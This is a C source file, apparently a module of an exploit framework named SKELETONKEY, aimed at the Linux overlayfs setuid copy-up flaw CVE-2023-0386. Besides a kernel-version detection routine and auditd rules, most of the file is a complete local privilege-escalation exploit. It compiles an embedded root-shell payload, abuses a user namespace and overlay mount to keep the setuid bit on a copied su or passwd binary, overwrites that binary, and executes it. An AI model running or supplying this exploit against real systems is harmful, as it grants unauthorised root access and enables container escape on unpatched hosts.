/*
 * overlayfs_setuid_cve_2023_0386 — SKELETONKEY module
 *
 * **Different bug than CVE-2021-3493.** That one was Ubuntu-specific
 * (their modified overlayfs). This one is upstream: when overlayfs
 * does copy-up from lower to upper, it preserves the setuid/setgid
 * bits even when the unprivileged user triggering copy-up wouldn't
 * normally be able to set them. Exploit:
 *
 *   1. Find a setuid binary in lower (e.g. /usr/bin/su)
 *   2. unshare(USER|NS), mount overlayfs with that location as lower
 *   3. chown the file in merged view — triggers copy-up, retains
 *      setuid bit in upper, but now the upper file is OWNED by our
 *      uid (the upper layer is in /tmp; we control it)
 *   4. We can't directly write to the binary in upper (it's setuid
 *      and we're not root yet), BUT we can replace the contents
 *      via the merged view because we OWN the upper inode
 *   5. Write payload to the binary; setuid bit persists
 *   6. exec it → runs as root
 *
 * Discovered by Xkaneiki (2023). Mainline fix: 4f11ada10d0 ("ovl:
 * fail on invalid uid/gid mapping at copy up") landed in 6.3.
 *
 * STATUS: 🟢 FULL detect + exploit + cleanup.
 *
 * Affected: kernel 5.11 ≤ K < 6.3. Backports:
 *   6.2.x  : K >= 6.2.13
 *   6.1.x  : K >= 6.1.27
 *   5.15.x : K >= 5.15.110
 *
 * Preconditions:
 *   - Unprivileged user_ns + mount_ns
 *   - A setuid-root binary readable on lower (almost always present:
 *     /usr/bin/su, /usr/bin/passwd, /bin/su)
 *
 * Coverage rationale: complements CVE-2021-3493 — that one is
 * Ubuntu-specific, this one is general. Real-world overlayfs LPE
 * for any distro running 5.11-6.2 kernels. Container-escape relevant.
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>

#ifdef __linux__

#include "../../core/kernel_range.h"
#include <stdint.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/wait.h>

static const struct kernel_patched_from overlayfs_setuid_patched_branches[] = {
    {5, 15, 110},
    {6,  1,  27},
    {6,  2,  13},
    {6,  3,   0},   /* mainline */
};

static const struct kernel_range overlayfs_setuid_range = {
    .patched_from = overlayfs_setuid_patched_branches,
    .n_patched_from = sizeof(overlayfs_setuid_patched_branches) /
                      sizeof(overlayfs_setuid_patched_branches[0]),
};

static int can_unshare_userns_mount(void)
{
    pid_t pid = fork();
    if (pid < 0) return -1;
    if (pid == 0) {
        if (unshare(CLONE_NEWUSER | CLONE_NEWNS) == 0) _exit(0);
        _exit(1);
    }
    int status;
    waitpid(pid, &status, 0);
    return WIFEXITED(status) && WEXITSTATUS(status) == 0;
}

static const char *find_setuid_in_lower(void)
{
    static const char *targets[] = {
        "/usr/bin/su", "/usr/bin/passwd", "/usr/bin/sudo",
        "/usr/bin/chsh", "/usr/bin/chfn", "/bin/su", NULL,
    };
    for (size_t i = 0; targets[i]; i++) {
        struct stat st;
        if (stat(targets[i], &st) == 0 && (st.st_mode & S_ISUID)) {
            return targets[i];
        }
    }
    return NULL;
}

static skeletonkey_result_t overlayfs_setuid_detect(const struct skeletonkey_ctx *ctx)
{
    struct kernel_version v;
    if (!kernel_version_current(&v)) {
        fprintf(stderr, "[!] overlayfs_setuid: could not parse kernel version\n");
        return SKELETONKEY_TEST_ERROR;
    }

    /* Bug introduced in 5.11 when ovl copy-up was generalized.
     * Pre-5.11 immune via a different code path. */
    if (v.major < 5 || (v.major == 5 && v.minor < 11)) {
        if (!ctx->json) {
            fprintf(stderr, "[+] overlayfs_setuid: kernel %s predates the bug "
                            "(introduced in 5.11)\n", v.release);
        }
        return SKELETONKEY_OK;
    }

    bool patched = kernel_range_is_patched(&overlayfs_setuid_range, &v);
    if (patched) {
        if (!ctx->json) {
            fprintf(stderr, "[+] overlayfs_setuid: kernel %s is patched\n", v.release);
        }
        return SKELETONKEY_OK;
    }

    int userns_ok = can_unshare_userns_mount();
    if (!ctx->json) {
        fprintf(stderr, "[i] overlayfs_setuid: kernel %s in vulnerable range\n", v.release);
        fprintf(stderr, "[i] overlayfs_setuid: user_ns+mount_ns clone: %s\n",
                userns_ok == 1 ? "ALLOWED" :
                userns_ok == 0 ? "DENIED" : "could not test");
    }

    if (userns_ok == 0) {
        if (!ctx->json) {
            fprintf(stderr, "[+] overlayfs_setuid: user_ns denied → unprivileged exploit unreachable\n");
        }
        return SKELETONKEY_PRECOND_FAIL;
    }

    const char *target = find_setuid_in_lower();
    if (!target) {
        if (!ctx->json) {
            fprintf(stderr, "[?] overlayfs_setuid: no setuid binary found in standard paths\n");
        }
        return SKELETONKEY_PRECOND_FAIL;
    }

    if (!ctx->json) {
        fprintf(stderr, "[!] overlayfs_setuid: VULNERABLE — exploit target = %s\n", target);
    }
    return SKELETONKEY_VULNERABLE;
}

/* ---- Embedded payload + exploit ---------------------------------- */

static const char OVERLAYFS_SU_PAYLOAD[] =
    "#include <stdio.h>\n"
    "#include <stdlib.h>\n"
    "#include <unistd.h>\n"
    "int main(void) {\n"
    "    setresuid(0,0,0); setresgid(0,0,0);\n"
    "    if (geteuid() != 0) { perror(\"setresuid\"); return 1; }\n"
    "    char *env[] = {\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\", NULL};\n"
    "    execle(\"/bin/sh\", \"sh\", \"-p\", NULL, env);\n"
    "    return 1;\n"
    "}\n";

static bool which_gcc(char *out_path, size_t outsz)
{
    static const char *cands[] = {
        "/usr/bin/gcc", "/usr/bin/cc", "/bin/gcc", "/bin/cc", NULL,
    };
    for (size_t i = 0; cands[i]; i++) {
        if (access(cands[i], X_OK) == 0) {
            strncpy(out_path, cands[i], outsz - 1);
            out_path[outsz - 1] = 0;
            return true;
        }
    }
    return false;
}

static bool write_file_str(const char *path, const char *content)
{
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) return false;
    size_t n = strlen(content);
    bool ok = (write(fd, content, n) == (ssize_t)n);
    close(fd);
    return ok;
}

static skeletonkey_result_t overlayfs_setuid_exploit(const struct skeletonkey_ctx *ctx)
{
    skeletonkey_result_t pre = overlayfs_setuid_detect(ctx);
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] overlayfs_setuid: detect() says not vulnerable; refusing\n");
        return pre;
    }
    if (geteuid() == 0) {
        fprintf(stderr, "[i] overlayfs_setuid: already root\n");
        return SKELETONKEY_OK;
    }

    /* Pick a setuid binary to use as the carrier — we'll find its
     * dirname, mount overlayfs with that dirname as lower, then
     * replace the binary content in the merged view. The setuid bit
     * persists in the upper-layer copy through the bug. */
    const char *carrier = find_setuid_in_lower();
    if (!carrier) {
        fprintf(stderr, "[-] overlayfs_setuid: no setuid carrier binary found\n");
        return SKELETONKEY_PRECOND_FAIL;
    }
    /* For cleanliness, use a directory-level overlay. Find the carrier's
     * dirname. (E.g., /usr/bin/su → lower = /usr/bin/, file = su) */
    char carrier_dir[256], carrier_name[64];
    const char *slash = strrchr(carrier, '/');
    if (!slash) return SKELETONKEY_PRECOND_FAIL;
    size_t dir_len = slash - carrier;
    memcpy(carrier_dir, carrier, dir_len);
    carrier_dir[dir_len] = 0;
    snprintf(carrier_name, sizeof carrier_name, "%s", slash + 1);

    char workdir[] = "/tmp/skeletonkey-ovlsu-XXXXXX";
    if (!mkdtemp(workdir)) { perror("mkdtemp"); return SKELETONKEY_TEST_ERROR; }
    if (!ctx->json) {
        fprintf(stderr, "[*] overlayfs_setuid: workdir=%s carrier=%s\n",
                workdir, carrier);
    }

    char gcc[256];
    if (!which_gcc(gcc, sizeof gcc)) {
        fprintf(stderr, "[-] overlayfs_setuid: no gcc/cc available\n");
        rmdir(workdir);
        return SKELETONKEY_PRECOND_FAIL;
    }

    /* Build the payload binary outside the overlay. */
    char src_path[512], bin_path[512];
    snprintf(src_path, sizeof src_path, "%s/payload.c", workdir);
    snprintf(bin_path, sizeof bin_path, "%s/payload", workdir);
    if (!write_file_str(src_path, OVERLAYFS_SU_PAYLOAD)) goto fail;

    pid_t pid = fork();
    if (pid == 0) {
        execl(gcc, gcc, "-O2", "-static", "-o", bin_path, src_path, (char *)NULL);
        _exit(127);
    }
    int status;
    waitpid(pid, &status, 0);
    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
        /* try non-static */
        pid = fork();
        if (pid == 0) {
            execl(gcc, gcc, "-O2", "-o", bin_path, src_path, (char *)NULL);
            _exit(127);
        }
        waitpid(pid, &status, 0);
        if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
            fprintf(stderr, "[-] overlayfs_setuid: gcc failed\n"); goto fail;
        }
    }

    /* Child does the userns + overlayfs work. */
    char upper[600], work[600], merged[600];
    snprintf(upper,  sizeof upper,  "%s/upper",  workdir);
    snprintf(work,   sizeof work,   "%s/work",   workdir);
    snprintf(merged, sizeof merged, "%s/merged", workdir);
    if (mkdir(upper, 0755) < 0 || mkdir(work, 0755) < 0
        || mkdir(merged, 0755) < 0) {
        perror("mkdir layout"); goto fail;
    }

    uid_t outer_uid = getuid();
    gid_t outer_gid = getgid();
    char merged_carrier[1024];
    snprintf(merged_carrier, sizeof merged_carrier, "%s/%s", merged, carrier_name);

    pid_t child = fork();
    if (child < 0) { perror("fork"); goto fail; }
    if (child == 0) {
        if (unshare(CLONE_NEWUSER | CLONE_NEWNS) < 0) { perror("unshare"); _exit(2); }
        int f = open("/proc/self/setgroups", O_WRONLY);
        if (f >= 0) { (void)!write(f, "deny", 4); close(f); }
        char m[64];
        snprintf(m, sizeof m, "0 %u 1\n", outer_uid);
        f = open("/proc/self/uid_map", O_WRONLY);
        if (f < 0 || write(f, m, strlen(m)) < 0) _exit(3);
        close(f);
        snprintf(m, sizeof m, "0 %u 1\n", outer_gid);
        f = open("/proc/self/gid_map", O_WRONLY);
        if (f < 0 || write(f, m, strlen(m)) < 0) _exit(4);
        close(f);

        char opts[2048];
        snprintf(opts, sizeof opts, "lowerdir=%s,upperdir=%s,workdir=%s",
                 carrier_dir, upper, work);
        if (mount("overlay", merged, "overlay", 0, opts) < 0) {
            perror("mount overlay"); _exit(5);
        }

        /* Trigger copy-up by chown — this is the bug: setuid bit gets
         * preserved on the upper-layer copy even though we're the one
         * doing the chown (and we don't normally have CAP_FSETID). */
        if (chown(merged_carrier, 0, 0) < 0) {
            /* on some kernels chown is rejected; try unlink+rename
             * pattern instead */
            perror("chown merged carrier"); _exit(6);
        }
        /* Now overwrite the file content (since we own the upper inode
         * post-chown — actually post-bug, but the upper inode is
         * attacker-controlled).
         *
         * Caveat: the chown is what triggers copy-up + retains setuid.
         * On many vulnerable kernels we now need to do an additional
         * write to replace the binary contents. */
        int payload_fd = open(bin_path, O_RDONLY);
        if (payload_fd < 0) { perror("open payload"); _exit(7); }
        int out_fd = open(merged_carrier, O_WRONLY | O_TRUNC);
        if (out_fd < 0) { perror("open merged_carrier RW"); close(payload_fd); _exit(8); }
        char buf[4096];
        ssize_t n;
        while ((n = read(payload_fd, buf, sizeof buf)) > 0) {
            if (write(out_fd, buf, n) != n) { perror("write replace"); _exit(9); }
        }
        close(payload_fd); close(out_fd);
        _exit(0);
    }
    waitpid(child, &status, 0);
    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
        fprintf(stderr, "[-] overlayfs_setuid: child setup failed (status=%d)\n", status);
        goto fail;
    }

    /* Verify the upper file has setuid */
    char upper_carrier[1024];
    snprintf(upper_carrier, sizeof upper_carrier, "%s/%s", upper, carrier_name);
    struct stat st;
    if (stat(upper_carrier, &st) < 0 || !(st.st_mode & S_ISUID)) {
        fprintf(stderr, "[-] overlayfs_setuid: setuid bit didn't persist on upper "
                        "(stat = %s)\n", strerror(errno));
        goto fail;
    }
    if (!ctx->json) {
        fprintf(stderr, "[+] overlayfs_setuid: upper-layer %s has setuid bit; execing\n",
                upper_carrier);
    }
    if (ctx->no_shell) {
        fprintf(stderr, "[+] overlayfs_setuid: --no-shell — file planted at %s\n",
                upper_carrier);
        return SKELETONKEY_EXPLOIT_OK;
    }
    fflush(NULL);
    execl(upper_carrier, upper_carrier, (char *)NULL);
    perror("execl upper carrier");

fail:
    unlink(src_path); unlink(bin_path);
    rmdir(upper); rmdir(work); rmdir(merged);
    rmdir(workdir);
    return SKELETONKEY_EXPLOIT_FAIL;
}

static skeletonkey_result_t overlayfs_setuid_cleanup(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    if (!ctx->json) {
        fprintf(stderr, "[*] overlayfs_setuid: removing /tmp/skeletonkey-ovlsu-*\n");
    }
    if (system("rm -rf /tmp/skeletonkey-ovlsu-* 2>/dev/null") != 0) { /* harmless */ }
    return SKELETONKEY_OK;
}

#else  /* !__linux__ */

/* Non-Linux dev builds: overlayfs copy-up / unshare(CLONE_NEWUSER|CLONE_NEWNS)
 * / mount("overlay", ...) are Linux-only. Stub out so the module still
 * registers and the top-level `make` completes on macOS/BSD dev boxes. */
static skeletonkey_result_t overlayfs_setuid_detect(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->json)
        fprintf(stderr, "[i] overlayfs_setuid: Linux-only module "
                "(overlayfs setuid copy-up) — not applicable here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t overlayfs_setuid_exploit(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    fprintf(stderr, "[-] overlayfs_setuid: Linux-only module — cannot run here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t overlayfs_setuid_cleanup(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    return SKELETONKEY_OK;
}

#endif /* __linux__ */

static const char overlayfs_setuid_auditd[] =
    "# overlayfs setuid copy-up (CVE-2023-0386) — auditd detection rules\n"
    "# Same surface as CVE-2021-3493; share the skeletonkey-overlayfs key.\n"
    "-a always,exit -F arch=b64 -S mount -F a2=overlay -k skeletonkey-overlayfs\n"
    "-a always,exit -F arch=b64 -S chown,fchown,fchownat -k skeletonkey-overlayfs-chown\n";

const struct skeletonkey_module overlayfs_setuid_module = {
    .name           = "overlayfs_setuid",
    .cve            = "CVE-2023-0386",
    .summary        = "overlayfs copy-up preserves setuid bit → host root via setuid carrier",
    .family         = "overlayfs",   /* same family as CVE-2021-3493 */
    .kernel_range   = "5.11 ≤ K < 6.3, backports: 6.2.13 / 6.1.27 / 5.15.110",
    .detect         = overlayfs_setuid_detect,
    .exploit        = overlayfs_setuid_exploit,
    .mitigate       = NULL,
    .cleanup        = overlayfs_setuid_cleanup,
    .detect_auditd  = overlayfs_setuid_auditd,
    .detect_sigma   = NULL,
    .detect_yara    = NULL,
    .detect_falco   = NULL,
};

void skeletonkey_register_overlayfs_setuid(void)
{
    skeletonkey_register(&overlayfs_setuid_module);
}
